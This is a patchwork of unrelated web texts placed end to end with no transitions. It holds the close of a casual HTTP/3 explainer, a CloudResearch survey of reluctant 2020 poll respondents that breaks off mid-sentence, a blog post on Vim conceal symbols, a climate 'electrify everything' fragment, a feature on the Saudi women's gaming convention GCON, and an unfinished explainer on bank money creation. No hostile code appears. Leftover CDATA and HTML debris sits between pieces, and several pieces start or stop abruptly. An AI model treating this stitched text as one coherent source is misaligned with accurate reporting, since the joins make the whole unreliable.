<p>TCP has to make several round trips just to establish a connection in a square and stable way. <strong>Where UDP doesn’t give a damn and does it really fast without stability and risk of lost packets. </strong>However UDP can dramatically reduce latency in requests. Up to almost zero latency in repeated connections to the same server because no roundtrip is made to establish connections.</p>



<figure><img src="https://i.imgur.com/hDmNkpS.png" data-src="https://i.imgur.com/hDmNkpS.png" alt="http3"></figure>



<p>HTTP3 is the multiplexing and compression features of HTTP2 with a protocol change from TCP to UDP. The Google guys then added their layer in the protocol to guarantee stability, order in the reception of packets and of course security. </p>



<p><strong>So HTTP3 uses UDP for its high speed while keeping the stability of QUIC</strong>, without forgetting the security of TLS. Because yes, in QUIC you find TLS 1.3 which allows you to make your beautiful SSL. I’ve been talking about layers for a while, this is what it looks like under the hood.</p>



<figure><img src="https://i.imgur.com/QdNsQHL.jpg" data-src="https://i.imgur.com/QdNsQHL.jpg" alt="http3"></figure>



<p>In 2018, QUIC became HTTP3. The Internet Enginerring Task Force dudes, <a href="https://www.youtube.com/watch?v=uVf_yyMfIPQ&amp;t=4956" target="_blank" rel="noreferrer noopener"><strong>dudes in shorts who decide on Internet protocols</strong></a>, have agreed. And that’s great news because the Internets will never be fast enough for us, impatient people.</p>



<h3>Epilogue</h3>



<p>HTTP3 is the sexy future with a HTTP base that has been tuned to the maximum by google geeks. At the time of writing, <a href="https://w3techs.com/technologies/details/ce-quic" target="_blank" rel="noreferrer noopener">only 4.6% of the Internet uses HTTP3</a> but this figure is likely to grow in the coming years. We stayed on the surface today, but there are a lot of deep-dive articles everywhere that I invite you to consult if you’re more curious.</p>

<![CDATA[Study: Are Election 2020 Poll Respondents Honest About Their Vote?]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>By Leib Litman, PhD, Zohn Rosen, PhD, Cheskie Rosenzweig, MS, Aaron Moss, PhD, Adam Dietrich, &amp; Jonathan Robinson, PhD</strong></p><h2><strong>Background</strong></h2><p>Lately, there’s been considerable debate over the accuracy of presidential polls. While recent polls show Joe Biden ahead,&nbsp;a number of pundits speculate that some Donald Trump supporters may be hesitant to share their true opinions when polled by phone. That hypothesis is gaining traction, leading some to argue that Trump may be leading despite what the latest numbers show. It’s also being fueled by the belief that 2020 will be a repeat of the 2016 election, when Trump polled poorly in advance of the election, but still went on to win the Electoral College vote.&nbsp;</p><p>Despite the current debate on whether there are segments of Trump (or Biden) backers reticent to express their true opinions in phone polls, there’s been little empirical investigation into if the phenomenon actually exists. Pundits on major broadcast and cable news networks, such as <a href="https://www.foxnews.com/opinion/does-a-shy-trump-voter-exist-arnon-mishkin" target="_blank" rel="noreferrer noopener">Fox News</a> and <a href="https://www.cnn.com/2020/08/09/politics/trump-voters-analysis/index.html" target="_blank" rel="noreferrer noopener">CNN</a>, continue to speculate on the potential impact of so-called “shy Trump voters” on the outcome of the November presidential election result.&nbsp; In a recent <a href="https://www.nytimes.com/2020/08/16/us/politics/trump-polls.html" target="_blank" rel="noreferrer noopener">article</a> published in <em>The New York Times</em>, David Winston says the following:&nbsp;</p><p><em>“The idea that people lie, it’s an interesting theory, and it’s not like it’s completely off-the-wall. But it’s obviously a very complicated thing to try to prove because what do you do? Ask them, ‘Are you lying?’”</em></p><p>On its face, a poll that asks people whether they lie in phone polls may not make much&nbsp;sense. After all, why would a person who lies in a telephone poll tell the truth about that in a different online poll? We here at CloudResearch reasoned that the issue may be methodological.</p><p>To explore this issue, we structured our survey to overcome shortcomings of previous polls. Instead of simply asking voters whom they will vote for — and then ask whether they just lied — we centered our research around a general question: “Are you comfortable in truthfully disclosing the presidential candidate you intend to vote for in a telephone poll?” Our rationale for this approach was that there’s a major difference between admitting you just lied and admitting to being genuinely concerned about disclosing your preferred candidate.&nbsp;</p><p>For the most part, we expected to find very few “shy voters.” After all, telephone surveys are supposed to be anonymous, so why would people be reluctant to share their opinions? However, to the extent people said that they were reluctant to express their voting preferences on a telephone poll, we were interested in their rationale for their reluctance. As a result, we included open-ended follow-up questions to better understand the factors that drive voters to fudge their responses.</p><hr><h2><strong>What CloudResearch Found</strong></h2><ul><li>11.7% of Republicans say they would not report their true opinions about their preferred presidential candidate on telephone polls.&nbsp;</li><li>In contrast, just 5.4% of Democrats say they’d be reluctant to share their true voting intentions — roughly half the number of Republicans reluctant to tell the truth on phone polls.&nbsp;</li><li>10.5% of Independents fell into the “shy voter” category, just a percentage point lower than how Republicans react to phone polls.&nbsp;&nbsp;</li></ul><p>After asking about people expressing their true opinions on telephone calls, we then inquired about their preferred candidate. This ordering was important as we did not want to fall into the same trap as other pollsters who tend to lead with preference declarations. When we broke the responses down based on current Trump vs Biden supporters, we found the following:</p><ul><li>10.1% of Trump supporters said they were likely to be untruthful on phone surveys — double the number of Biden supporters (5.1%) reticent to share their true intentions.</li></ul><p>When respondents indicated that they were untruthful during polls, we followed up to confirm those responses, and then inquired as to why “shy voters” are concerned about sharing their voting intentions. Some example responses are below. These are just a representational sampling of viewpoints that we collected — sentiments not easy to gauge by responses to mere yes/no questions.&nbsp;</p><p><em>“I don’t believe the information would be confidential and I think it’s dangerous to express an opinion outside of the current liberal viewpoint.”</em></p><p><em>“Well I probably wouldn’t give my opinion period, but if pushed, I would not give my real opinion for fear of reprisal if someone found out.”</em></p><p><em>“Because most polls released to the public are slanted and aren’t scientifically based. So, they are messing with the results of the survey from the beginning by knocking down one party or the other. I’m just trying to right the ship.”</em></p><p><em>“I am hounded day and evening by phone solicitors.&nbsp; They interrupt me all the time; sometimes my irritation takes over, and I don’t answer correctly.”</em></p><p><em>“My answers could be recorded so I don’t really trust such phone conversations.”</em></p><p><em>“I do not discuss politics — let alone with a total stranger on the telephone.”</em></p><p><em>“I don’t always trust phone call surveys. I wouldn’t want to be bombarded with phone calls and political mail.”</em></p><p><em>“I don’t want my opinion associated with my phone number.”</em></p><p><em>“I am less anonymous, and somewhat ashamed of my opinion as it is frowned upon.”</em></p><hr><h2>In General, “Shy Voters” Cited Six Concerns:&nbsp;</h2><p>1. A lack of trust in phone polls as truly being anonymous.&nbsp;</p><p>2. An apprehension to associate their phone numbers with recorded responses.</p><p>3. Fear that their responses will become public in some manner.</p><p>4. Fear of reprisal and related detrimental impact to their financial, social, and family lives should their political opinions become publicly known.&nbsp;</p><p>5. A general dislike of phone polls.&nbsp;</p><p>6. Malicious intent to mislead polls due to general distrust of media and political pundits (though a sentiment expressed only by a few “shy voters”).&nbsp;</p><p>Such concerns were more often than not expressed by Republicans and Independents, and also by those who said they would vote for Donald Trump. Democrats and Biden supporters lagged both groups in terms of being concerned that their voting intentions would be shared with others.&nbsp;</p><p>However, our survey findings — that show a greater reluctance on the part of Republicans, Independents and Trump voters to disclose their opinions — should not be interpreted as outright lying. Rather, such reluctance seems to stem from a&nbsp; lack of trust in the anonymity of polls and a fear of the consequences if their opinions were to become public.&nbsp;</p><p>The results could have implications in terms of the true accuracy of phone polls; if Republicans, Independents and supporters of Donald Trump (regardless of party affiliation) are less likely to participate in polls or accurately disclose the candidate they support, that inherently generates biased poll outcomes.</p><p>Given razor thin-margins in the swing states, such bias may have important consequences, although more research is required to fully understand the potential magnitude of this effect. We intend to examine the magnitude of “shy-voter bias” in specific states like Arizona, Florida, Michigan, North Carolina, Pennsylvania, and Wisconsin over the coming weeks.&nbsp;</p><p>The results of our survey also illustrate the primary concerns that pollsters may need to address to allay voters about the level of anonymity and privacy of phone polling. We’ll also examine these issues and potential remedies in future research.</p><hr><h2><strong>Methodology</strong></h2><h3><strong>Sample&nbsp;</strong></h3><p>Interviews were collected from two national online sample waves of 1,000 registered voters (2000 respondents in total), matched to U.S. Census data on gender, age, race, and region. Data were collected August 19 – 27, 2020&nbsp;using&nbsp;<a target="_blank" href="https://slack-redir.net/link?url=https%3A%2F%2Fwww.cloudresearch.com%2Fproducts%2Fprime-panels%2F" rel="noreferrer noopener">CloudResearch’s Prime Panels</a>, a platform that incorporates data quality checks in sample recruitment and sources participants from an aggregate of market research panels (<a target="_blank" href="https://slack-redir.net/link?url=https%3A%2F%2Flink.springer.com%2Farticle%2F10.3758%2Fs13428-019-01273-7" rel="noreferrer noopener">Chandler et al., 2019</a>). The two waves differed from each other in terms of how quotas were set. In the first sample, the full sample was matched to the U.S. Census and the sample was equally split between Republicans, Democrats and Independents. In the second wave, rather than matching the entire sample to the U.S. Census, each political party was matched to the demographic quotas appropriate for that party. The results presented above are for the first wave of participants, although the overall findings were similar across both waves. Specifically, in Wave 2, 10.5% of Trump supporters said they were likely to be untruthful on phone surveys compared to 4.6% of Biden supporters.</p><h3><strong>Survey Design&nbsp;</strong></h3><p>Prior to entering the survey, all respondents were screened for attentiveness and English language comprehension. Following the screening process a <em>responsive verification protocol</em> was used, consisting of multiple interactive interview steps. Step 1 – Respondents were first asked one of two randomly assigned questions: Q1 – “Given today’s charged political environment, if you were asked in an automated telephone poll (also called “Interactive Voice Response” or “IVR”), would you give your true opinion about which presidential candidate you are likely to vote for?”. Q2 – “Given today’s charged political environment, if you were asked by a telephone interviewer, would you give your true opinion about which presidential candidate you are likely to vote for?”. We also wanted to compare how comfortable respondents are in responding to telephone polls, compared to online and in-person polls. We therefore also asked the same question about phone interviews, online surveys, and in-person polls, presented next to each other in the same grid. The response options to all questions were: 1. “I would definitely express my true opinion”, 2. “I would probably express my true opinion”, 3. “I would probably not express my true opinion” and 4. “I would definitely not express my true opinion”.</p><p>Step 2 – For those who indicated that they would not provide their true opinion on either question from Step 1 (i.e. responded with options 3 or 4), a follow-up question was asked: “On a previous question, you indicated that you …</p></div></div>

  <p>Whenever someone sees my editor, this is always the first thing they ask
about.</p>

<p>Vim (and Emacs) have features that let you conceal text with other text.
The actual source text is not modified. If you put your cursor on the
concealed line, the conceal goes away.</p>

<p>This is best illustrated by example. Here’s what the Python code
normally looks like:</p>

<pre><code>identity = lambda x: x
</code></pre>

<p>But here’s what I see:</p>

<pre><code>identity = λ x: x
</code></pre>

<p>It’s really easy to abuse since no one has to view it but you, unlike
code formatting. I ended up creating an entire mini-language, consistent
across multiple programming languages.</p>

<p>The running examples throughout this blog post will be Python and Rust,
because I’ve used those recently. Haskell is another language that
benefits a lot from this.</p>

<h2 id="basics">Basics</h2>

<blockquote>
  <p>By relieving the brain of all unnecessary work, a good notation sets
it free to concentrate on more advanced problems, and in effect
increases the mental power of the race.</p>
</blockquote>

<p>So we start by unifying the building blocks of every language with
prettier Unicode versions.</p>

<pre><code>==          | ≝
!=          | ≠
&lt;=          | ≤
&gt;=          | ≥

and, &amp;&amp;     | ∧
or, ||      | ∨
not, !      | ¬

None        | ∅
true, false | ⊤, ⊥ (top and bottom from logic)

for         | ∀
in          | ∈
not in      | ∉

=           | ← (to remind me that equality is really assignment)
-&gt;          | → (that's an arrow replaced by a better arrow)

assert      | ‼
</code></pre>

<p>Types are concealed with their math symbols</p>

<pre><code>bool        | 𝔹
char        | ∁
string, str | 𝐒

unsigned    | ℕ
int         | ℤ
float       | ℝ
complex     | ℂ

vector      | V
tensor      | 𝕋
</code></pre>

<p>This is nice because it makes reading code uniform across languages.
Basic constructs like <code>for .. in ..</code> read like math.</p>

<h2 id="idiosyncratic">Idiosyncratic</h2>

<p>Most of this category is for making ugly syntax bearable.</p>

<p>I read a lot of scientific code and Greek letters as variable names
abound.</p>

<p>So I concealed the entire Greek alphabet, lower and uppercase.</p>

<p>I also don’t like looking at <code>::</code> in C++ and Rust. Conceptually, it’s
like a dot operator for the purposes of reading code, so I conceal it
with <code>.</code>.</p>

<p>I also don’t like looking at semicolons, and my linter will tell me if I
missed them, so they get concealed with <code>𐤟</code> (which is apparently a
Phoenician word separator. It should look like a very faint dot, but may
not render correctly in the browser. You can see I’ve scoured a lot of
glyphs for this).</p>

<p>I hate the use of <code>self</code> in Python, so I concealed it with <code>♀</code>, the
female sign emoji. It looks like a little person (a little <em>self</em>), and
is a single character.</p>

<p>If I’m going to see a word a lot in a lot of contexts, it’s probably
going to end up concealed.</p>

<h3 id="grammar-of-control-flow">Grammar of control flow</h3>

<p>I have a system for conditionals and looping.</p>

<pre><code>loop              | ∞ (`loop` is just `while True`)
while             | ⥁
continue          | ↻

match, if         | ▸
elif              | ▹
else              | ▪

break             | ◁
return            | ◀


def, fn, function | ※ (Japanese typography reference marker)
class             | §
</code></pre>

<p>The infinity and ouroboros symbols for <code>loop</code> and <code>while</code> feel
intuitive.</p>

<p>The rest, not so much. I worked up this system late at night.</p>

<p><code>continue</code> is a loop because it doesn’t break out of the loop (that’s
why it loops clockwise since I always imagine looping going clockwise).
It’s a broken ouroboros because it cuts off the current iteration.</p>

<p>The conditionals always start with an <code>if</code>, which is filled in, and just
gets a pointer to indicate, “hey look at this condition”. Conditions
have to end with an <code>if</code> or an <code>else</code>, but not an <code>elif</code>, so <code>elif</code> gets
an empty pointer. <code>else</code> is indicated by the mathematical “end of proof”
symbol, since the <code>else</code> ends the conditional. In this way, a
conditional is only valid if it begins and ends with solid markers.</p>

<p><code>return</code> takes you out of a function’s scope, and I think of going in
scope as going rightwards, so <code>return</code> points left. Plus the right
pointer was taken by <code>if</code>. <code>break</code> is similar but may not take you out
of <em>all</em> scopes, just the innermost loop enclosing it.</p>

<p>I think the <code>function</code> conceal is pretty clear. The <code>class</code> conceal is
because I think of classes like I think of sections in an essay, so they
get a section marker.</p>

<h2 id="really-idiosyncratic">Really Idiosyncratic</h2>

<p>AKA mathy.</p>

<pre><code>range  | ι
unsafe | ☡

struct | ∏
enum   | ∐
</code></pre>

<p>The iota is because that’s the one bit of APL I know.</p>

<p><code>unsafe</code> comes from the “dangerous bend” symbol that Bourbaki used to
indicate a tricky section in their books. That concession to
user-friendliness ironically concealed a dangerous bend. Which was the
fact that Bourbaki books don’t care about anyone being able to read
them.</p>

<p><code>struct</code> and <code>enum</code> are product and sum (AKA coproduct) types, so they
get the corresponding symbols from category theory.</p>

<h2 id="why">Why?</h2>

<p>It lets me <em>feel</em> my code rather than read it. It makes seeing the
<em>shape</em> of code easier at first pass, and I can see the forest for the
trees somewhat better. But then I have to hunker down and edit it.</p>

<h2 id="important">Important</h2>

<pre><code>function! ToggleConcealLevel()
    if &amp;conceallevel == 0
        setlocal conceallevel=2
    else
        setlocal conceallevel=0
    endif
endfunction

nnoremap &lt;silent&gt; &lt;C-c&gt;&lt;C-y&gt; :call ToggleConcealLevel()&lt;CR&gt;
</code></pre>

<p>That toggles the conceal. Now other people can read over your shoulder.
It’ll also spare you explanations of how you got the <code>for</code> to look like
it does in math.</p>

<h2 id="screenshot">Screenshot</h2>

<p>(Since so many of you asked)</p>

We look for solutions, not barriers. We outline pathways to success.</p><p>We don't begin with the question of what is politically possible, but ask what is technically necessary to make a climate solution that is also the best economic pathway for the country. We need mobilization of technology, industry, labor, regulatory reform, and critically, finance.</p><p>This pathway is technology-agnostic; we have used the test “is it ready and does it work?'' to understand the ideal way forward. This pathway is best summarized as <strong>electrify everything</strong>.</p><p>We lean on data and an unprecedented analysis of the U.S. energy economy that allows us to look at the consequences of electrifying everything. Will our lives change? The surprising answer is not a lot. Those things that will change, though, are for the better: cleaner air, cleaner water, better health, cheaper energy, and a more robust grid. We can have pretty much all of the complexity and variety of the American dream, with the same-sized homes and vehicles – and we'll need less than half the energy we currently use. This is a success story that casts aside trying to “efficiency” or “deprive” our way to zero emissions.</p><p>How do we ensure the lowest cost of energy while electrifying everything? First, we have to rewrite the federal, state, and local rules and regulations that were created for the fossil-fueled world and are preventing the U.S. from having the cheapest electricity ever. Then, we have to finance our transition to a zero-carbon energy system with a low-interest ``climate loan.'' We have precedents and mechanisms for doing this; the U.S. pioneered public-private financing in the past that can help us get the job done today.</p><p>The consequence of getting the technology, financing, and regulations right is that we can save every family in the U.S. thousands of dollars a year.</p><p>We will need to triple the amount of electricity delivered in the U.S., and we'll discover that the moonshot engineering project we need is a new grid with new operating rules, more like the Internet. We must have “grid neutrality.”</p><p>The industrial mobilization required will mean an effort similar to WWII's Arsenal of Democracy in size, speed, and scope.</p><p>For a world looking to bounce back from a pandemic, there is no other project that would create this many jobs. An analysis shows that there are tens of millions of good paying jobs that will be created in every zip code, suburb, and rural town in the country.</p><p>It is by no means easy, but it is still possible. But not for long. Billionaires may dream of escaping to Mars, but the rest of us... we have to stay and fight.</p></div></div></div>]]>

<p>In April 2012, three college juniors — Felwa, Tasnim, and Najla — waited anxiously on the campus of Prince Sultan University in Riyadh. For the previous six months, their lives had been consumed by the pursuit of a single, radical idea: frustrated that women, year after year, were barred from the annual Gamers’ Day convention, <a href="http://gamersday.com/en/about-us.php#:~:text=Gamers'%20Day%20is%20a%20gaming,numbers%20of%20visitors%20and%20exhibitors">the largest annual gaming convention in Saudi Arabia</a>, they had decided to launch the first-ever gamers’ convention for women in the kingdom. As the organizers hurried around counting consoles and hanging posters near stalls, they wondered whether anyone would show up.</p>



<p>Over the past decade, Saudi Arabia’s gaming scene has dramatically evolved, especially for women. In the early 2000s, the country had strict moral regulations on entertainment, and games were mostly sold in a gray market or through unofficial channels. Areej, a 23-year-old university graduate, picked up her interest in gaming from her father, who once frequented the informal neighborhood stores that sold pirated copies of popular games for 10 riyals ($2). “He played Japanese and English games, even though he didn’t even understand English back then,” she recalled. “He would keep dictionaries around while playing. That’s actually how he learned the language.” Areej hopes to become a “localizer,” a job that entails translating English-language games into Arabic. A decade ago, this wouldn’t have been possible.&nbsp;</p>



<p>After Sony’s 2007 release of the PlayStation 3 in the kingdom, the gaming industry began to take shape in Saudi Arabia. The first <a href="https://www.gamersday.com/en/">Gamers’ Day</a> took place in 2008, and it now draws upward of 60,000 male visitors over the course of four days. The convention presents video game companies with a lucrative opportunity to demo their latest equipment and products; devoted players, in turn, get to try out highly anticipated games that have not yet been released. In 2012, as the three girls were setting up Girls Con (or GCON as it would come to be known), the industry was estimated to have a global revenue stream of $70 billion.</p>



<p>In the months prior to GCON, Tasnim, the only one in the group with work experience, took the lead pitching sponsorship proposals to the all-male staffs at Nintendo and PlayStation Arabia. Without any real data on female gamers in the Middle East, and with barely any on girl gamers in North America, she had pitched on the assumption that the <a href="https://newzoo.com/insights/articles/male-and-female-gamers-how-their-similarities-and-differences-shape-the-games-market/">gender ratio for gamers in Saudi Arabia</a> was likely the same as in the United States: 47%. But there was no way to prove this. Until then, the world of female gaming in Saudi Arabia was a private one, usually set in the intimacy of people’s bedrooms.</p>



<p>“You could find girls who played video games, just for fun or on their mobile phone, but I had no idea how many girls were into hardcore gaming,” Felwa said. While mobile games like Angry Birds and Candy Crush were popular — the Kingdom boasts a <a href="https://www2.deloitte.com/content/dam/Deloitte/xe/Documents/technology-media-telecommunications/GMCS-whitepaper.pdf">90% cell phone penetration rate</a> — Felwa was curious to see how many girls had grown up like her playing Tomb Raider, Tekken, and League of Legends.</p>



<p>When the hall flooded with nearly 3,000 women, some as young as 13 and others in their 50s, it was a shock. “I definitely did not expect moms to come,” Felwa said. Back then, it was mandatory for women to wear the traditional black abaya, and often a headscarf, while in public. It was only when the women walked through the doors into the all-female space that their abayas slipped off to reveal an array of cosplay costumes.</p>



<p>Inside the hallway, girls who were expected to behave discreetly at all times rushed around trying to play as many PlayStation- and Nintendo-sponsored games as they could. On one side of the hall, first-time cosplayers shared a rare opportunity to express their fandom. On the other, 150 people stood in a rowdy line waiting their turn in a Call of Duty tournament.</p>

<p><strong>While the Middle</strong> <strong>East</strong> represents only a small portion of the international gaming industry, it is a rapidly expanding market. In 2017, the countries of the Gulf Cooperation Council accounted for around $693 million of gaming revenue, most related to esports. By 2021, that number is expected to exceed <a href="https://www.strategyand.pwc.com/m1/en/press-releases/2020/gcc-gaming-market.html">$821 million</a>, boosted in part by the pandemic-induced lockdown.&nbsp;</p>



<p>Saudi Arabia expects to be at the forefront<strong> </strong>of that expansion. In a country where roughly 50% of the population is under 30, gaming has become an emblem for a generation of young Saudis.&nbsp;</p>



<p>In recent years, Prince Faisal bin Bandar, a young member of the royal family raised on Atari consoles, set out to make Saudi Arabia the Middle East’s hub for the $160 billion gaming industry. Under his leadership, the<strong> </strong><a href="https://safeis.sa/">Saudi Arabian Federation for Electronic and Intellectual Sports (SAFEIS)</a> aims for esports revenue to amount to 1% of the country’s GDP (approximately $22 billion) by 2030.</p>



<p>While Saudi Arabia was a late arrival to esports, its male players have already made their mark. Since 2017, Prince Faisal and the federation have been scouting, coaching, and sending professional esports players to competitions across the world. Mossad Al-Dossary, then 18, made headlines in 2018 after <a href="https://www.ea.com/games/fifa/news/msdossary-triumphs-fifa-eworld-cup-grand-final-london">winning first place</a> at the FIFA eWorld Cup in London, taking home a $250,000 cash prize.&nbsp;</p>



<p>Female gamers, however, are still finding their way. Women in Felwa, Tasnim, and Najla’s generation grew up under the watch of religious police, in a time when public spaces were segregated by gender. While women still do not have the same rights as men, Crown Prince Mohammed bin Salman<strong> </strong>has relaxed male-guardianship rules and mandatory dress codes and legalized certain forms of entertainment for women. “I still struggle to convey what Saudi Arabia was like at that time to those that haven’t had that experience,” Tess said. There were no theaters, and sports facilities for girls were limited, “So, mostly, we had to stay inside and make do with what we had — and games were all that we had.”</p>



<p>Raghad, 23, currently works for a mining company, but she dreams of becoming a voice actor for video games. Although she’s never lived anywhere but Saudi Arabia, she has a distinctly squeaky American accent — a curious trait she picked up from a fifth-grade teacher who had lived in the U.S. and a torrent of YouTube videos. She is considering taking voice-acting classes online, assuming she can find any, because she’s not allowed to travel abroad alone to study until after she’s married. It’s still common to meet women who come to gaming as a result of these kinds of restrictions, as Felwa, Tasnim, and Najla did years ago. This is why going to GCON can be such a powerful experience.&nbsp;</p>

<p><strong>In 2018, Felwa,</strong> Tasnim, and Najla handed GCON over to Ghada Al-Moqbel, who attended her first GCON in 2013 at the age of 18. Now she leads Saudi Arabia’s women’s gaming community. This occurred right after bin Salman took control and began dismantling the country’s gender segregation. For Ghada and the wider community of female gamers, these changes forced them to decide whether they wanted to stay on the fringes of the gaming community or take a more central role. In 2018, GCON organizers met regularly to discuss whether there was still value in creating an exclusively female space for gaming.</p>



<figure><blockquote><p>“We had to stay inside and make do with what we had — and games were all that we had.”</p></blockquote></figure>



<p>For Ghada, the answer was yes. While attitudes toward female gamers have improved, parts of Saudi society remain uncomfortable with this burgeoning culture. When GCON first launched, participants were criticized for indulging in supposedly immoral behavior, and social media accounts of female gamers were routinely hacked. Likewise, after the first Comic Con in Jeddah, in 2017, a<a href="https://twitter.com/hashtag/%D9%83%D9%88%D9%85%D9%8A%D9%83%D9%88%D9%86_%D8%AD%D9%81%D9%84_%D8%B9%D8%A8%D8%AF%D8%A9_%D8%A7%D9%84%D8%B4%D9%8A%D8%B7%D8%A7%D9%86_%D8%A8%D8%AC%D8%AF%D9%87?src=hashtag_click"> hashtag</a> accusing participants of being Satan worshippers flooded social media along with pictures of women who had dressed up for cosplay. Thanks in part to the continuing fear of societal backlash, many Saudi women still advocate for all-female events.&nbsp;</p>



<p>But like the kingdom, GCON is also evolving. “We’re not just entertainment anymore,” Ghada said. “It’s about empowering and enabling women to be serious in the gaming and esports industry.” In mid-August, Princess Nourah bint Abdulrahman University, the largest women-only university in the world, <a href="https://www.arabnews.com/node/1718151/saudi-arabia">announced</a> that it would be creating a degree program for animation.</p>



<p>Since Ghada took over, the organization has expanded, hosting regular skill-development workshops as well as the annual convention. While she has maintained GCON’s focus on female gamers, she has been open to collaborating with their male peers. In 2017, organizers from Gamer’s Day worked with GCON to arrange their first mixed-gender gaming event. While 2020 was supposed to be a big year for Ghada and GCON, Covid-19 disrupted their plans. Nonetheless, it’s unlikely that GCON — a force that arose in far more challenging terrain — will be going away anytime soon.</p>

<p>Most people are familiar with central banks’ ability to create money out of thin air. A central bank has access to physical printing presses which can produce physical banknotes, and it has the corresponding ability to create electronic money. However, central banks are not the only entities which create money. Money is also created by regular banks, such as retail banks and commercial banks, in the process of making loans.</p>
<p>Many people believe that regular banks’ ability to create money is similar to central banks’ ability to create money. It is not. This misconception has been perpetuated by a powerful cast of characters which includes <a href="https://www.hs.fi/tiede/art-2000002869261.html" target="_blank">mainstream news outlets</a> and even <a href="https://www.sciencedirect.com/science/article/pii/S1057521914001070" target="_blank">some economists</a>.</p>
<p>This article will demystify money creation by illustrating the following facts:</p>
<ul>
<li>A bank deposit is merely an IOU.</li>
<li>A bank loan is merely an exchange of 2 IOUs.</li>
<li>Anyone can create IOUs out of thin air.</li>
<li>When a customer redeems an IOU at a bank, the bank typically needs to hand over another form of money — the kind that it cannot create out of thin air.</li>
</ul>
<p><strong>Bank deposits are merely IOUs</strong></p>
<p>Suppose you have $100 in cash. You decide to deposit it at your local bank. Now you no longer have $100 in cash. Instead, you have a <em>promise</em> from the bank that you can withdraw $100 in cash at any time. The bank has $100 in cash and you have a promise. Let’s imagine this promise as a physical document acknowledging debt, an IOU (”I owe you”). The bank owes you $100 and promises that you can exchange this IOU to $100 cash at any time.</p>

<p>Is this IOU ”money”? We’ll get to that later, but the short answer is yes, that IOU is money. There are different types of money, and checking account deposits are usually considered to be a type of money.</p>
<p>Let’s illustrate this bank deposit as an exchange:</p>

<p>Assets are things the bank <em>owns</em>, liabilities are things the bank <em>owes</em>. In this simplified example, the only asset that the bank has is the $100 in cash that you deposited — now considered to be the <em>bank’s</em> asset — and the only liability is the $100 debt that the bank owes to you. These accounting entries were created at the same time: when the bank incremented your checking account by $100 (the deposit liability in bank’s accounting), there was a corresponding $100 cash deposit (the cash asset in bank’s accounting).</p>
<p><strong>A bank loan is merely an exchange of 2 IOUs</strong></p>
<p>Let’s continue with the example where you deposited $100 to a bank. Suppose I will go into that bank and ask for a $10 loan. Now that the bank owns $100, it can easily afford to loan me $10. I promise to pay back $11 at a later point in time, so the bank is eager to offer me a loan and make that dollar.</p>
<p>The bank deposits this $10 loan to my checking account. Remember, checking account deposits are IOUs, so the bank just gave me a $10 IOU. I promised to pay back $11, so I also created an IOU. In other words, this loan is an exchange of 2 IOUs: the bank promises to give me $10 in cash whenever I want, and I promise to give the bank $11 at a later point in time. Let’s imagine these IOUs as physical documents:</p>

<p>The bank still has that $100 cash in assets, and it still has that $100 liability to John. But now the bank also has a $10 liability to me: I could withdraw my $10 from the bank in cash at any time. Corresponding to this liability, the bank has recorded a new asset: my promise to pay back $11 later.</p>
<p>Notice how the bank now has $110 of deposits, but only $100 of cash in the vault. Welcome to fractional reserve banking! If I decided to withdraw my $10 from the bank today, and you decided to withdraw your $100 from the bank tomorrow, the bank would say ”oops, we no longer have your money”. In practice this rarely happens due to a myriad of reasons (banks can trade assets between each other when they have too little/too much cash, banks have internal risk controls which limit lending and other risky endeavours, lawmakers impose restrictions which are monitored by regulators, the existence of deposit insurance reduces likelihood of bank runs, etc.).</p>
<p>Anyway, let’s get to the interesting bit. Before taking out the loan there was $100 on checking account balances and afterwards there was $110 on checking account balances. Clearly, money was created in the process of taking out the loan. Where did this money come from? Was it created out of thin air? The short answer is yes, kind of, but let’s step back a little bit.</p>
<p><strong>What is money, anyway?</strong></p>
<p>Let’s go back to the cash deposit example. You deposit $100 into a bank and the bank records it as an asset. The bank records a corresponding liability: a $100 deposit to your checking account. Did the bank create money in this scenario?</p>
<p>Before the deposit there was $100 of cash money, but after the deposit there was $100 of cash money + $100 of electronic money = $200 worth of money in total. But of course we don’t want to ”double count” your money just because you deposited it in a bank, right? That’s why economists developed this convention that cash money in a bank’s vault is considered to be ”out of circulation”, and thus, is not typically counted when we count how much money exists.</p>

<p>The Eurozone M1 definition for money is <a href="https://www.ecb.europa.eu/stats/money_credit_banking/monetary_aggregates/html/hist_content.en.html" target="_blank">basically</a> equal to this notion of ”currency in circulation”. The concept of money is ambiguous, so there are many different definitions, varying by both economic area and by use case. Nevertheless, checking account balances are included in most commonly used definitions (though not in all, for instance the UK M0 definition for money <a href="https://www.bankofengland.co.uk/statistics/details/further-details-about-m0-data" target="_blank">does not</a> include checking account balances).</p>
<p>In abstract terms we might think that the $100 cash you deposited into a bank was transformed into a $100 checking account balance. Except it wasn’t. That $100 of cash money still exists. It was not transformed into anything. The bank took $100 of cash and put it in a vault. Then the bank created an IOU out of thin air and gave it to you. (We can say that the IOU was created out of thin air, because the corresponding $100 cash in the vault is not earmarked to this IOU — the bank may run out of cash before you try to redeem that IOU.) Then economists decided that the IOU counts as money, and the cash in the vault does not count as money. Thus, the act of depositing cash in a bank does not result in (net) creation of money. $100 of electronic money is added to circulation while $100 of cash money is removed from circulation, for a net difference of $0.</p>
<p>When you deposit cash in a bank, the bank creates an IOU out of thin air. Similarly, when you take a loan out of a bank, the bank creates an IOU out of thin air. However, due to accounting conventions, the latter action results in net money creation, while the former action does not. (Although these conventions are weird, they make sense: currency in circulation is a good measure with real implications for economic activity, and currency in circulation is genuinely increased when banks loan money.)</p>
<p><strong>Anyone can create IOUs out of thin air</strong></p>
<p>If there’s only one thing you take away from this article, let it be this. IOUs are promises. Anyone can make promises out of thin air. For example, I could be handing out IOUs like this, furbished with my signature for authenticity:</p>

<p>You might think these would be worthless, but that’s not exactly the case. People who know me would think ”Atte is good for $10”. These would not be worth exactly $10, because you would still rather take $10 in cash than a coupon that’s exchangeable for $10 in cash. And it’s unlikely that these IOUs would be used to facilitate real economic activity, so these IOUs should not be considered ”money”. Although there are clear differences in how these IOUs <em>would be used</em>, compared to the IOUs created by banks, is there any <em>fundamental</em> difference between the IOUs themselves?</p>
<p>Let’s take another example and get one step closer to creating money. This one is real, not hypothetical, example of IOUs created by a non-bank corporation.</p>
<p>We have to go all the way back to 2011. Poker is booming and Full Tilt Poker is one of 2 giants dominating the scene (the other being PokerStars). The way that poker sites work is you deposit money (like you would in a bank) and then as you play poker and you win and lose money from other players, the poker site keeps track of how much money everyone has (like a bank would keep track of transfers between customers of the same bank).</p>
